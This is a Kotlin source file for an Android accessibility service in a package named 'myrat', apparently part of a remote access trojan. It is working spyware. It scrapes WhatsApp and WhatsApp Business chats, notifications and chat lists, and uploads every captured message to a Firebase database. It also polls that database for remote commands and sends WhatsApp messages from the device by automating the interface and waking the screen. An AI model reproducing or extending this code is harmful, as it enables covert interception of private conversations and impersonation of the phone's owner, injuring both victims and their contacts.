package com.myrat.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.firebase.database.*
import com.myrat.app.MainActivity
import com.myrat.app.utils.*
import kotlinx.coroutines.*
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap

class WhatsAppService : AccessibilityService() {

    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val messageCache = ConcurrentHashMap<String, Long>()
    private val contactCache = ConcurrentHashMap<String, Boolean>()
    private val valueEventListener = ConcurrentHashMap<String, ValueEventListener>()
    private var wakeLock: PowerManager.WakeLock? = null
    private var screenWakeLock: PowerManager.WakeLock? = null
    private val handler = Handler(Looper.getMainLooper())
    private val pendingCommands = mutableListOf<SendCommand>()
    private var isProcessingCommand = false

    data class SendCommand(
        val number: String,
        val message: String,
        val packageName: String,
        val timestamp: Long = System.currentTimeMillis(),
        val retryCount: Int = 0
    )

    override fun onCreate() {
        super.onCreate()
        try {
            acquireWakeLocks()
            deviceId = MainActivity.getDeviceId(this)
            Logger.log("WhatsAppService started for deviceId: $deviceId")
            
            // Create notification channels
            NotificationHelper.createNotificationChannels(this)
            
            startForegroundService()
            setupAccessibilityService()
            loadKnownContacts()
            scheduleCacheCleanup()
            listenForSendMessageCommands()
            setupCommandProcessor()
        } catch (e: Exception) {
            Logger.error("Failed to create WhatsAppService", e)
        }
    }

    private fun acquireWakeLocks() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "WhatsAppService:KeepAlive"
            )
            wakeLock?.acquire(Constants.WAKE_LOCK_TIMEOUT)

            screenWakeLock = powerManager.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                "WhatsAppService:ScreenWake"
            )

            Logger.log("Wake locks acquired for WhatsAppService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake locks for WhatsApp", e)
        }
    }

    private fun startForegroundService() {
        try {
            val notification = NotificationHelper.buildServiceNotification(
                this,
                Constants.NOTIFICATION_CHANNEL_WHATSAPP,
                "WhatsApp Monitor",
                "Monitoring WhatsApp messages and commands"
            )
            startForeground(12, notification)
        } catch (e: Exception) {
            Logger.error("Failed to start WhatsApp foreground service", e)
        }
    }

    private fun setupAccessibilityService() {
        try {
            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_VIEW_SELECTED

                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                        AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY

                packageNames = arrayOf(Constants.WHATSAPP_PACKAGE, Constants.WHATSAPP_BUSINESS_PACKAGE)
                notificationTimeout = 50
            }
            serviceInfo = info
            Logger.log("Accessibility service configured for comprehensive monitoring")
        } catch (e: Exception) {
            Logger.error("Failed to setup accessibility service", e)
        }
    }

    private fun setupCommandProcessor() {
        scope.launch {
            while (isActive) {
                try {
                    delay(1000)
                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
                        processNextCommand()
                    }
                } catch (e: Exception) {
                    Logger.error("Error in command processor", e)
                }
            }
        }
    }

    private suspend fun processNextCommand() {
        if (isProcessingCommand || pendingCommands.isEmpty()) return

        isProcessingCommand = true
        try {
            val command = pendingCommands.removeAt(0)
            Logger.log("Processing WhatsApp command: ${command.number} - ${command.message}")

            wakeUpScreen()
            sendWhatsAppMessage(command.number, command.message, command.packageName)
            delay(2000)
        } catch (e: Exception) {
            Logger.error("Error processing command", e)
        } finally {
            isProcessingCommand = false
        }
    }

    private fun wakeUpScreen() {
        try {
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) {
                Logger.log("Waking up screen for WhatsApp interaction")
                screenWakeLock?.let { wakeLock ->
                    if (!wakeLock.isHeld) {
                        wakeLock.acquire(30000)
                        Logger.log("Screen wake lock acquired")
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error waking up screen", e)
        }
    }

    private fun scheduleCacheCleanup() {
        scope.launch {
            try {
                while (isActive) {
                    delay(Constants.CACHE_CLEANUP_INTERVAL)
                    val now = System.currentTimeMillis()
                    val removedEntries = messageCache.entries.filter { 
                        now - it.value > Constants.MESSAGE_CACHE_DURATION 
                    }
                    removedEntries.forEach { messageCache.remove(it.key) }
                    if (removedEntries.isNotEmpty()) {
                        Logger.log("Cache cleaned, removed ${removedEntries.size} entries")
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in cache cleanup", e)
            }
        }
    }

    private fun loadKnownContacts() {
        try {
            db.child("Device").child(deviceId).child("whatsapp/contacts")
                .get().addOnSuccessListener { snapshot ->
                    snapshot.children.forEach { contact ->
                        contactCache[contact.key!!] = true
                    }
                    Logger.log("Loaded ${contactCache.size} known contacts")
                }.addOnFailureListener { e ->
                    Logger.log("Failed to load contacts: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("Error loading known contacts", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        if (event.packageName != Constants.WHATSAPP_PACKAGE && 
            event.packageName != Constants.WHATSAPP_BUSINESS_PACKAGE) return

        scope.launch {
            try {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                        handleContentChange(event)
                    }
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                        handleWindowStateChange(event)
                    }
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                        handleNotificationChange(event)
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error processing accessibility event", e)
            }
        }
    }

    private fun handleNotificationChange(event: AccessibilityEvent) {
        try {
            val notificationText = event.text?.joinToString(" ") ?: return
            if (notificationText.isBlank()) return

            val packageName = event.packageName.toString()
            val timestamp = System.currentTimeMillis()

            val parts = notificationText.split(":", limit = 2)
            if (parts.size >= 2) {
                val sender = parts[0].trim()
                val message = parts[1].trim()

                if (sender.isNotEmpty() && message.isNotEmpty()) {
                    val messageId = generateMessageId(sender, message, timestamp, packageName, "Received")

                    if (!messageCache.containsKey(messageId)) {
                        messageCache[messageId] = timestamp

                        val isNewContact = !contactCache.containsKey(sender)
                        if (isNewContact) {
                            contactCache[sender] = true
                        }

                        val messageData = mapOf(
                            "sender" to sender,
                            "recipient" to "You",
                            "content" to message,
                            "timestamp" to timestamp,
                            "type" to "Received",
                            "isNewContact" to isNewContact,
                            "uploaded" to System.currentTimeMillis(),
                            "messageId" to messageId,
                            "packageName" to packageName,
                            "direction" to "Received",
                            "source" to "notification"
                        )

                        Logger.log("New message from notification: $sender -> $message")
                        uploadMessage(messageData)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling notification change", e)
        }
    }

    private fun handleContentChange(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            val packageName = event.packageName.toString()

            if (isChatScreen(rootNode, packageName)) {
                extractMessagesFromChat(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling content change", e)
        }
    }

    private fun handleWindowStateChange(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            val packageName = event.packageName.toString()

            if (isChatListScreen(rootNode, packageName)) {
                extractChatListData(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling window state change", e)
        }
    }

    private fun isChatScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            val conversationLayouts = listOf("conversation_layout", "chat_layout", "conversation_container")
            conversationLayouts.any { id ->
                try {
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
                } catch (e: Exception) {
                    false
                }
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun isChatListScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            val chatRowIds = listOf("conversations_row", "chat_row", "conversation_item")
            chatRowIds.any { id ->
                try {
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
                } catch (e: Exception) {
                    false
                }
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun extractMessagesFromChat(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val messageIds = listOf("message_text", "text_message", "message_body", "chat_message_text")
            val messageNodes = messageIds.flatMap { id ->
                try {
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
                } catch (e: Exception) {
                    emptyList()
                }
            }

            messageNodes.forEach { node ->
                try {
                    extractAndUploadMessage(node, packageName)
                } catch (e: Exception) {
                    Logger.error("Error extracting message from node", e)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error extracting messages from chat", e)
        }
    }

    private fun extractAndUploadMessage(node: AccessibilityNodeInfo, packageName: String) {
        try {
            val messageText = node.text?.toString() ?: return
            if (messageText.isBlank()) return

            val parent = node.parent ?: return
            val timestamp = System.currentTimeMillis()
            val direction = if (isOutgoingMessage(parent, packageName)) "Sent" else "Received"
            val chatName = getCurrentChatName(packageName) ?: "Unknown"

            val messageId = generateMessageId(chatName, messageText, timestamp, packageName, direction)
            if (messageCache.containsKey(messageId)) return

            messageCache[messageId] = timestamp

            val isNewContact = !contactCache.containsKey(chatName) && direction == "Received"
            if (isNewContact) {
                contactCache[chatName] = true
            }

            val messageData = mapOf(
                "sender" to (if (direction == "Sent") "You" else chatName),
                "recipient" to (if (direction == "Sent") chatName else "You"),
                "content" to messageText,
                "timestamp" to timestamp,
                "type" to direction,
                "isNewContact" to isNewContact,
                "uploaded" to System.currentTimeMillis(),
                "messageId" to messageId,
                "packageName" to packageName,
                "direction" to direction,
                "source" to "accessibility"
            )

            Logger.log("New message: $direction from ${messageData["sender"]} ($packageName)")
            uploadMessage(messageData)
        } catch (e: Exception) {
            Logger.error("Error extracting and uploading message", e)
        }
    }

    private fun isOutgoingMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            val outgoingIds = listOf("outgoing_msg_indicator", "sent_indicator", "message_status")
            outgoingIds.any { id ->
                try {
                    parent.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
                } catch (e: Exception) {
                    false
                }
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun getCurrentChatName(packageName: String): String? {
        return try {
            val rootNode = rootInActiveWindow ?: return null
            val titleIds = listOf("conversation_contact_name", "contact_name", "chat_title", "header_title", "toolbar_title")
            titleIds.forEach { id ->
                try {
                    val titleNode = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                    if (titleNode != null) {
                        return titleNode.text?.toString()
                    }
                } catch (e: Exception) {
                    // Continue to next ID
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String, direction: String): String {
        return try {
            val input = "$sender$text$timestamp$packageName$direction${System.nanoTime()}"
            MessageDigest.getInstance("SHA-256")
                .digest(input.toByteArray())
                .joinToString("") { "%02x".format(it) }
                .substring(0, 32)
        } catch (e: Exception) {
            "error_${System.currentTimeMillis()}_${(1000..9999).random()}"
        }
    }

    private fun uploadMessage(message: Map<String, Any>) {
        scope.launch {
            try {
                val messagesRef = db.child("Device").child(deviceId).child("whatsapp/data")
                messagesRef.child(message["messageId"] as String).setValue(message)
                    .addOnSuccessListener {
                        Logger.log("Message uploaded: ${message["content"]} (${message["packageName"]})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Message upload failed: ${e.message}", e)
                    }
            } catch (e: Exception) {
                Logger.error("Error uploading message", e)
            }
        }
    }

    private fun extractChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatRowIds = listOf("conversations_row", "chat_row", "conversation_item")
            val chatNodes = chatRowIds.flatMap { id ->
                try {
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
                } catch (e: Exception) {
                    emptyList()
                }
            }
            
            val chats = mutableListOf<Map<String, Any>>()

            chatNodes.forEach { chatNode ->
                try {
                    val nameIds = listOf("conversation_contact_name", "contact_name", "chat_title")
                    val name = nameIds.mapNotNull { id ->
                        try {
                            chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                        } catch (e: Exception) {
                            null
                        }
                    }.firstOrNull() ?: ""

                    val lastMessage = try {
                        chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/conversation_last_message")
                            .firstOrNull()?.text?.toString() ?: ""
                    } catch (e: Exception) {
                        ""
                    }

                    if (name.isNotEmpty()) {
                        chats.add(mapOf(
                            "name" to name,
                            "lastMessage" to lastMessage,
                            "timestamp" to System.currentTimeMillis(),
                            "packageName" to packageName
                        ))
                    }
                } catch (e: Exception) {
                    Logger.error("Error processing chat node", e)
                }
            }

            if (chats.isNotEmpty()) {
                db.child("Device").child(deviceId).child("whatsapp/chats").setValue(chats)
                    .addOnSuccessListener {
                        Logger.log("Chat list uploaded: ${chats.size} chats ($packageName)")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload chat list ($packageName): ${e.message}", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error extracting chat list data", e)
        }
    }

    private fun listenForSendMessageCommands() {
        try {
            val sendRef = db.child("Device").child(deviceId).child("whatsapp/commands")
            val listener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { command ->
                            try {
                                val number = command.child("number").getValue(String::class.java) ?: return@forEach
                                val message = command.child("message").getValue(String::class.java) ?: return@forEach
                                val packageName = command.child("packageName").getValue(String::class.java) 
                                    ?: Constants.WHATSAPP_PACKAGE

                                Logger.log("Received send command for $number: $message ($packageName)")

                                pendingCommands.add(SendCommand(number, message, packageName))
                                command.ref.removeValue()
                            } catch (e: Exception) {
                                Logger.error("Error processing individual command", e)
                            }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing send commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Failed to read send command: ${error.message}")
                }
            }
            valueEventListener["sendCommands"] = listener
            sendRef.addValueEventListener(listener)
        } catch (e: Exception) {
            Logger.error("Error setting up send message commands listener", e)
        }
    }

    private suspend fun sendWhatsAppMessage(recipient: String, message: String, packageName: String) {
        try {
            Logger.log("🚀 Starting to send message to $recipient via $packageName")

            // Check if WhatsApp is installed
            if (!WhatsAppHelper.isWhatsAppInstalled(this, packageName)) {
                Logger.error("$packageName not installed")
                return
            }

            wakeUpScreen()
            delay(1000)

            // Launch WhatsApp
            val intent = WhatsAppHelper.getLaunchIntent(this, packageName) ?: run {
                Logger.error("Cannot get launch intent for $packageName")
                return
            }

            startActivity(intent)
            delay(4000) // Wait for app to load

            var rootNode = rootInActiveWindow
            if (rootNode == null) {
                Logger.error("Cannot get root node for $packageName")
                return
            }

            // Step 1: Find and click search
            if (!WhatsAppHelper.findAndClickSearch(rootNode, packageName)) {
                Logger.error("❌ Search button not found ($packageName)")
                return
            }

            delay(2000)

            // Step 2: Enter recipient in search field
            rootNode = rootInActiveWindow ?: return
            if (!WhatsAppHelper.enterSearchText(rootNode, packageName, recipient)) {
                Logger.error("❌ Search field not found ($packageName)")
                return
            }

            delay(3000)

            // Step 3: Click on the contact result - IMPROVED
            rootNode = rootInActiveWindow ?: return
            if (!WhatsAppHelper.clickContactResult(rootNode, packageName, recipient)) {
                Logger.error("❌ Contact result not found for $recipient ($packageName)")
                return
            }

            delay(3000)

            // Step 4: Enter message in input field
            rootNode = rootInActiveWindow ?: return
            if (!WhatsAppHelper.enterMessage(rootNode, packageName, message)) {
                Logger.error("❌ Message input not found ($packageName)")
                return
            }

            delay(2000)

            // Step 5: Click send button
            rootNode = rootInActiveWindow ?: return
            if (WhatsAppHelper.clickSendButton(rootNode, packageName)) {
                Logger.log("🎉 Successfully sent message to $recipient ($packageName)")

                // Log sent message
                val messageData = mapOf(
                    "sender" to "You",
                    "recipient" to recipient,
                    "content" to message,
                    "timestamp" to System.currentTimeMillis(),
                    "type" to "Sent",
                    "isNewContact" to !contactCache.containsKey(recipient),
                    "uploaded" to System.currentTimeMillis(),
                    "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
                    "packageName" to packageName,
                    "direction" to "Sent",
                    "source" to "command"
                )
                uploadMessage(messageData)
            } else {
                Logger.error("❌ Send button not found ($packageName)")
            }

            // Release screen wake lock
            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                    Logger.log("Screen wake lock released after sending")
                }
            }

        } catch (e: Exception) {
            Logger.error("Error sending message ($packageName): ${e.message}", e)
            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                }
            }
        }
    }

    override fun onInterrupt() {
        Logger.log("WhatsAppService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            screenWakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            scope.cancel()
            valueEventListener.forEach { (_, listener) ->
                try {
                    db.child("Device").child(deviceId).child("whatsapp/commands")
                        .removeEventListener(listener)
                } catch (e: Exception) {
                    Logger.error("Error removing listener", e)
                }
            }
            valueEventListener.clear()
            Logger.log("WhatsAppService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying WhatsAppService", e)
        }
    }
}